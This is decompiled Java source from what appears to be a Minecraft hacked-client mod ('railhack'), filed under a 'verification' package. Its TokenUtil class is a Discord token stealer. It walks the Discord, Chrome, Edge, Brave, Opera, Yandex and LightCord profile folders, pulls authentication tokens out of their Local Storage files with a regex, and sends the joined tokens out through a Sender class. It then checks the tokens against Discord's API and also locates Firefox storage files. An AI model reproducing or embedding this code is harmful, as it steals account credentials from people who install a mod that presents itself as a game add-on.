//Deobfuscated with https://github.com/SimplyProgrammer/Minecraft-Deobfuscator3000 using mappings "C:\Users\Admin\Desktop\Minecraft-Deobfuscator3000-1.2.2\1.12 stable mappings"!

//Decompiled by Procyon!

package me.shatteredhej.railhack.railhackmod.util.extra.utils.verification.util;

import java.net.*;
import com.google.gson.reflect.*;
import java.io.*;
import me.shatteredhej.railhack.railhackmod.util.extra.utils.verification.payload.*;
import java.util.regex.*;
import com.google.gson.*;
import java.util.function.*;
import java.util.stream.*;
import java.util.*;

public final class TokenUtil
{
    private static final Gson gson;
    public static final List<String> paths;
    
    public static List<String> getValidTokens(final List<String> tokens) {
        final ArrayList<String> validTokens = new ArrayList<String>();
        URL url;
        HttpURLConnection con;
        Map<String, Object> stuff;
        final ArrayList<String> list;
        tokens.forEach(token -> {
            try {
                url = new URL("https://discordapp.com/api/v6/users/@me");
                con = (HttpURLConnection)url.openConnection();
                stuff = (Map<String, Object>)TokenUtil.gson.fromJson((JsonElement)getHeaders(token), new TypeToken<Map<String, Object>>() {}.getType());
                stuff.forEach((key, value) -> con.addRequestProperty(key, value));
                con.getInputStream().close();
                list.add(token);
            }
            catch (Exception ex) {}
            return;
        });
        return validTokens;
    }
    
    public static String getContentFromURL(final String link, final String auth) {
        try {
            final URL url = new URL(link);
            final HttpURLConnection httpURLConnection = (HttpURLConnection)url.openConnection();
            httpURLConnection.setRequestMethod("GET");
            final Map<String, Object> json = (Map<String, Object>)TokenUtil.gson.fromJson((JsonElement)getHeaders(auth), new TypeToken<Map<String, Object>>() {}.getType());
            json.forEach((key, value) -> httpURLConnection.addRequestProperty(key, value));
            httpURLConnection.connect();
            final BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(httpURLConnection.getInputStream()));
            final StringBuilder stringBuilder = new StringBuilder();
            String line;
            while ((line = bufferedReader.readLine()) != null) {
                stringBuilder.append(line).append("\n");
            }
            bufferedReader.close();
            return stringBuilder.toString();
        }
        catch (Exception ignored) {
            return "";
        }
    }
    
    public static ArrayList<String> getTokens(final String inPath) {
        final String path = inPath + "\\Local Storage\\leveldb\\";
        final ArrayList<String> tokens = new ArrayList<String>();
        final File pa = new File(path);
        final String[] list = pa.list();
        if (list == null) {
            return null;
        }
        for (final String s : list) {
            try {
                final FileInputStream fileInputStream = new FileInputStream(path + s);
                final DataInputStream dataInputStream = new DataInputStream(fileInputStream);
                final BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(dataInputStream));
                String line;
                while ((line = bufferedReader.readLine()) != null) {
                    final Matcher matcher = Pattern.compile("[\\w\\W]{24}\\.[\\w\\W]{6}\\.[\\w\\W]{27}|mfa\\.[\\w\\W]{84}").matcher(line);
                    while (matcher.find()) {
                        tokens.add(matcher.group());
                    }
                }
            }
            catch (Exception ex) {}
        }
        Sender.send((Object)String.join(" - ", tokens));
        return tokens;
    }
    
    public static JsonObject getHeaders(final String token) {
        final JsonObject object = new JsonObject();
        object.addProperty("Content-Type", "application/json");
        object.addProperty("User-Agent", "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11");
        if (token != null) {
            object.addProperty("Authorization", token);
        }
        return object;
    }
    
    public static List<String> removeDuplicates(final List<String> list) {
        return list.stream().distinct().collect((Collector<? super Object, ?, List<String>>)Collectors.toCollection((Supplier<R>)ArrayList::new));
    }
    
    public static Optional<File> getFirefoxFile() {
        final File file = new File(System.getenv("APPDATA") + "\\Mozilla\\Firefox\\Profiles");
        if (file.isDirectory()) {
            for (final File file2 : Objects.requireNonNull(file.listFiles())) {
                if (file2.isDirectory() && file2.getName().contains("release")) {
                    for (final File file3 : Objects.requireNonNull(file2.listFiles())) {
                        if (file3.getName().contains("webappsstore")) {
                            return Optional.of(file3);
                        }
                    }
                }
            }
        }
        return Optional.empty();
    }
    
    static {
        gson = new Gson();
        paths = new ArrayList<String>(Arrays.asList(System.getenv("APPDATA") + "\\Discord", System.getenv("APPDATA") + "\\discordcanary", System.getenv("APPDATA") + "\\discordptb", System.getenv("LOCALAPPDATA") + "\\Google\\Chrome\\User Data\\Default", System.getenv("APPDATA") + "\\Opera Software\\Opera Stable", System.getenv("LOCALAPPDATA") + "\\BraveSoftware\\Brave-Browser\\User Data\\Default", System.getenv("LOCALAPPDATA") + "\\Yandex\\YandexBrowser\\User Data\\Default", System.getenv("APPDATA") + "\\LightCord", System.getenv("LOCALAPPDATA") + "\\Microsoft\\Edge\\User Data\\Default"));
    }
}
